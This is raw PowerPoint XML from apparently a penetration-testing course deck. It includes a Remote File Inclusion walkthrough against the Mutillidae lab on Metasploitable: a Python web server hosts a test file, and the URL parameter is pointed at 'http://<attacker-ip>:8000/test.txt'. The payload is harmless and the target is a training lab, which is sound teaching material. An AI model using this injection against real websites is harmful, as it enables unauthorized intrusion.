                <a:solidFill>
                  <a:srgbClr val="991793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File Inclusion (RFI)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Step 1 — Prepare Remote File (Attacker Machine)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Create a simple file:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill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echo "RFI_TEST" &gt; test.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 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Start a web server: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python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1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http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1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8000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 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Your file is now available at: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http://&lt;attacker-ip&gt;:8000/test.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a: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062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/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="130629" y="133499"/>
            <a:ext cx="11125200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Step 2 — Modify the Parameter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Go to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Mutillidae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File Inclusion lab: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http://&lt;metasploitable-ip&gt;/mutillidae/index.php?page=home.php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Replace parameter with your remote file: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?page=http://&lt;attacker-ip&gt;:8000/test.txt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Full URL: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http://&lt;metasploitable-ip&gt;/mutillidae/index.php?page=http://&lt;attacker-ip&gt;:8000/test.txt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Step 3 — Observe the Output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If vulnerable, the page shows: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RFI_TEST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This confirms Remote File Inclusion (RFI).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0140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525"/>
            <a:ext cx="8258175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1500" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="8000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thank</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You</a:t>
            </a:r>
            <a:endParaRPr sz="8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12762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412</TotalTime>
  <Words>2618</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>429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51" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Black</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Berlin Sans FB</vt:lpstr>
      <vt:lpstr>Berlin Sans FB Demi</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Segoe UI Symbol</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Trebuchet MS</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Wingdings 3</vt:lpstr>
      <vt:lpstr>Facet</vt:lpstr>
      <vt:lpstr>Week 4</vt:lpstr>
      <vt:lpstr>Week 04: Web Application  Penetration Testing  (OWASP Top 10)  </vt:lpstr>
      <vt:lpstr>Task 01: Burp Suite Mastery  (The Interceptor)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02</vt:lpstr>
      <vt:lpstr>Task 02: Injection Attacks  (SQLi &amp; Command Injection)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04: Cross-Site Scripting (XSS) &amp; File Inclusion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Gh0stRift</dc:creator>
  <cp:lastModifiedBy>Gh0stRift</cp:lastModifiedBy>
  <cp:revision>36</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-18T06:31:59Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-12T15:52:09Z</dcterms:modified>
</cp:coreProperties>
</file>